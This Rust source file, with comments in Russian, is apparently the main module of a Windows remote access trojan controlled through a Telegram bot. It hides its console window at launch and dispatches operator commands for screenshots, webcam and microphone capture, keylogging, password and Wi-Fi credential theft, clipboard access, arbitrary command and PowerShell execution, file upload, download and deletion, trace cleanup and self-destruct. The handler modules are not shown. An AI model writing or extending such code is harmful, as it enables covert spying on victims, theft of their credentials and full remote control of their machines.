#![windows_subsystem = "windows"]

mod config;
mod device_manager;
mod telegram_client;
mod system_commands;
mod file_commands;
mod monitoring_commands;
mod security_commands;
mod execution_commands;
mod popup_commands;
mod advanced_commands;
mod auth;
mod token_security;

use std::sync::Arc;
use anyhow::Result;
use tokio::signal;

#[cfg(windows)]
extern "system" {
    fn GetConsoleWindow() -> *mut std::ffi::c_void;
    fn ShowWindow(hwnd: *mut std::ffi::c_void, n_cmd_show: i32) -> i32;
    fn FreeConsole() -> i32;
}

#[cfg(windows)]
fn hide_console_immediately() {
    unsafe {
        let console_window = GetConsoleWindow();
        if !console_window.is_null() {
            ShowWindow(console_window, 0); // SW_HIDE = 0
            FreeConsole(); // Освобождаем консоль полностью
        }
    }
}

use config::{init_logging, validate_config};
use device_manager::DeviceManager;
use telegram_client::{TelegramClient, Message};

#[tokio::main]
async fn main() -> Result<()> {
    // Немедленно скрываем консоль при запуске
    #[cfg(windows)]
    hide_console_immediately();
    
    // Проверяем аргументы командной строки для генерации хешей
    let args: Vec<String> = std::env::args().collect();
    if args.len() == 3 && args[1] == "--generate-hash" {
        if let Ok(chat_id) = args[2].parse::<i64>() {
            match auth::generate_chat_hash(chat_id) {
                Ok(_hash) => {
                    // В silent режиме не выводим хеш в консоль
                    std::process::exit(0);
                }
                Err(_e) => {
                    std::process::exit(1);
                }
            }
        } else {
            // В silent режиме не выводим сообщения об ошибках
            std::process::exit(1);
        }
    }

    // Инициализация файлового логирования (вместо консоли)
    init_logging().await?;

    // Проверка конфигурации
    validate_config().await?;

    // Создание менеджера устройств
    let device_manager = Arc::new(DeviceManager::new());
    
    // Создание Telegram клиента
    let telegram_client = Arc::new(TelegramClient::new());
    
    // Обработка сообщений
    let updates_future = handle_updates(telegram_client.clone(), device_manager.clone());
    
    tokio::select! {
        result = updates_future => {
            if let Err(e) = result {
                // В silent режиме логируем в файл вместо консоли
                log::error!("Ошибка обработки обновлений: {}", e);
            }
        }
        _ = signal::ctrl_c() => {
            // В silent режиме тихо завершаемся
        }
    }

    Ok(())
}

async fn handle_updates(
    telegram_client: Arc<TelegramClient>,
    device_manager: Arc<DeviceManager>
) -> Result<()> {
    let mut offset = 0;
    
    loop {
        match telegram_client.get_updates(offset).await {
            Ok(updates) => {
                for update in updates {
                    if let Some(message) = update.message {
                        offset = update.update_id + 1;
                        
                        let telegram_client_clone = telegram_client.clone();
                        let device_manager_clone = device_manager.clone();
                        
                        tokio::spawn(async move {
                            if let Err(e) = handle_message(telegram_client_clone, device_manager_clone, message).await {
                                log::error!("Ошибка обработки сообщения: {}", e);
                            }
                        });
                    }
                }
            }
            Err(e) => {
                log::error!("Ошибка получения обновлений: {}", e);
                tokio::time::sleep(std::time::Duration::from_secs(5)).await;
            }
        }
    }
}

async fn handle_message(
    telegram_client: Arc<TelegramClient>,
    device_manager: Arc<DeviceManager>,
    message: Message
) -> Result<()> {
    let chat_id = message.chat.id;
    
    // Проверка авторизации
    if !auth::is_authorized_chat_id(chat_id) {
        return Ok(()); // Тихо игнорируем неавторизованных пользователей
    }

    if let Some(text) = message.text {
        let response = process_command(&telegram_client, &device_manager, &text, chat_id).await?;
        telegram_client.send_message(chat_id, &response).await?;
    }

    Ok(())
}

async fn process_command(
    telegram_client: &TelegramClient,
    device_manager: &DeviceManager,
    text: &str,
    chat_id: i64
) -> Result<String> {
    let parts: Vec<&str> = text.trim().split_whitespace().collect();
    let command = parts.get(0).unwrap_or(&"").to_lowercase();
    
    match command.as_str() {
        "/start" | "/help" => {
            Ok(telegram_client.get_help_message().await)
        }
        "/ping" => {
            Ok("🔥 Bot is active! 🔥".to_string())
        }
        "/info" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            system_commands::handle_info_command(device_manager, device_id).await
        }
        "/screenshot" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            let result = monitoring_commands::handle_screenshot_command(device_manager, device_id).await?;
            
            if let Ok(screenshot_data) = result.parse::<Vec<u8>>() {
                telegram_client.send_photo(chat_id, screenshot_data, "Screenshot").await?;
                Ok("📸 Screenshot sent!".to_string())
            } else {
                Ok(result)
            }
        }
        "/webcam" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            monitoring_commands::handle_webcam_command(device_manager, device_id).await
        }
        "/microphone" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            let duration = parts.get(2).and_then(|s| s.parse::<u32>().ok()).unwrap_or(10);
            monitoring_commands::handle_microphone_command(device_manager, device_id, duration).await
        }
        "/keylogger" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            let action = parts.get(2).unwrap_or(&"status");
            monitoring_commands::handle_keylogger_command(device_manager, device_id, action).await
        }
        "/processes" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            system_commands::handle_processes_command(device_manager, device_id).await
        }
        "/kill" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            let process_name = parts.get(2).unwrap_or(&"");
            system_commands::handle_kill_command(device_manager, device_id, process_name).await
        }
        "/execute" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            let command_args = parts.get(2..).unwrap_or(&[]).join(" ");
            execution_commands::handle_execute_command(device_manager, device_id, &command_args).await
        }
        "/powershell" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            let ps_command = parts.get(2..).unwrap_or(&[]).join(" ");
            execution_commands::handle_powershell_command(device_manager, device_id, &ps_command).await
        }
        "/upload" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            file_commands::handle_upload_command(device_manager, device_id, message).await
        }
        "/download" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            let file_path = parts.get(2..).unwrap_or(&[]).join(" ");
            file_commands::handle_download_command(device_manager, device_id, &file_path).await
        }
        "/ls" | "/dir" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            let directory = parts.get(2).unwrap_or(&".");
            file_commands::handle_list_command(device_manager, device_id, directory).await
        }
        "/delete" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            let file_path = parts.get(2..).unwrap_or(&[]).join(" ");
            file_commands::handle_delete_command(device_manager, device_id, &file_path).await
        }
        "/popup" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            let popup_text = parts.get(2..).unwrap_or(&[]).join(" ");
            popup_commands::handle_popup_command(device_manager, device_id, &popup_text).await
        }
        "/clipboard" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            let action = parts.get(2).unwrap_or(&"get");
            let content = if action == "set" { 
                Some(parts.get(3..).unwrap_or(&[]).join(" ").as_str()) 
            } else { 
                None 
            };
            security_commands::handle_clipboard_command(device_manager, device_id, action, content).await
        }
        "/passwords" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            security_commands::handle_passwords_command(device_manager, device_id).await
        }
        "/wifi" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            security_commands::handle_wifi_command(device_manager, device_id).await
        }
        "/apps" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            execution_commands::handle_apps_command(device_manager, device_id).await
        }
        "/cleanup" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            advanced_commands::handle_cleanup_command(device_manager, device_id).await
        }
        "/selfdestruct" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            let confirmation = parts.get(2);
            advanced_commands::handle_selfdestruct_command(device_manager, device_id, confirmation).await
        }
        "/shutdown" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            let delay = parts.get(2).and_then(|s| s.parse::<u32>().ok());
            advanced_commands::handle_shutdown_command(device_manager, device_id, delay).await
        }
        "/monitor" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            let action = parts.get(2).unwrap_or(&"status");
            monitoring_commands::handle_monitor_command(device_manager, device_id, action).await
        }
        _ => {
            Ok("❓ Unknown command. Send /help for available commands.".to_string())
        }
    }
}